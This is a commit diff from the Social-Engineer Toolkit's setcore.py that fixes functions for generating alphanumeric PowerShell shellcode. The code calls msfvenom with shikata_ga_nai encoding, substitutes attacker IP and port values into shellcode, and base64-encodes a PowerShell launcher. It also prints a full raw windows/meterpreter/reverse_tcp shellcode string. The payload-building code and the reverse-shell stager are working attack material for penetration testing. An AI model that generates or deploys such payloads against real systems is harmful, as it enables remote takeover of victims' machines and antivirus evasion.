a73bea73dc430942af967729486f71ab0f8d996f
TrustedSec <davek@trustedsec.com>
2016-01-23 18:37:45 -0500

    additional fixes to alphanumeric shellcode generation

--- src/core/setcore.py
+++ src/core/setcore.py
@@ -1387,6 +1387,7 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
         shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
         # sub in \x for 0x
         shellcode = re.sub("\\\\x", "0x", shellcode)
+        shellcode = shellcode.replace("\\", "")
         # base counter
         counter = 0
         # count every four characters then trigger floater and write out data
@@ -1403,6 +1404,7 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
 
         # heres our shellcode prepped and ready to go
         shellcode = newdata[:-1]
+
     except Exception as e:
         print_error("Something went wrong, printing error: " + str(e))
     # powershell command here, needs to be unicoded then base64 in order to
@@ -1417,8 +1419,6 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
     return base64.b64encode(powershell_command.encode('utf_16_le'))
 
 # generate base shellcode
-
-
 def generate_shellcode(payload, ipaddr, port):
 
     msf_path = meta_path()
@@ -1427,17 +1427,16 @@ def generate_shellcode(payload, ipaddr, port):
     proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" %
                             (msf_path, payload, ipaddr, port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
-    data = str(data)
+    data = data.decode('ascii')
     # start to format this a bit to get it ready
     #repls = {';': '', ' ': '', '+': '', '"': '', '\n': '',
     #         'unsigned char buf=': '', 'unsignedcharbuf[]=': ''}
-    repls = [';', ' ', '+', '"', '\n', 'unsigned char buf=', 'unsignedcharbuf[]=']
+    repls = [';', ' ', '+', '"', '\n', 'unsigned char buf=', 'unsignedcharbuf[]=', "b'", "'", '\\n']
     for repl in repls: data = data.replace(repl, "")
     return data
 
 # this will take input for shellcode and do a replace for IP addresses
 def shellcode_replace(ipaddr, port, shellcode):
-
     # split up the ip address
     ip = ipaddr.split('.')
     # join the ipaddress into hex value spaces still in tact
@@ -1500,8 +1499,6 @@ def shellcode_replace(ipaddr, port, shellcode):
     return shellcode
 
 # exit routine
-
-
 def exit_set():
     cleanup_routine()
     print("\n\n Thank you for " + bcolors.RED + "shopping" + bcolors.ENDC +
@@ -1511,7 +1508,6 @@ def exit_set():
 
 # these are payloads that are callable
 def metasploit_shellcode(payload, ipaddr, port):
-
     # if we are using reverse meterpreter tcp
     if payload == "windows/meterpreter/reverse_tcp":
         shellcode = r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"
@@ -1548,8 +1544,6 @@ def metasploit_shellcode(payload, ipaddr, port):
 
 # here we encrypt via aes, will return encrypted string based on secret
 # key which is random
-
-
 def encryptAES(secret, data):
 
     # the character used for padding--with a block cipher such as AES, the value
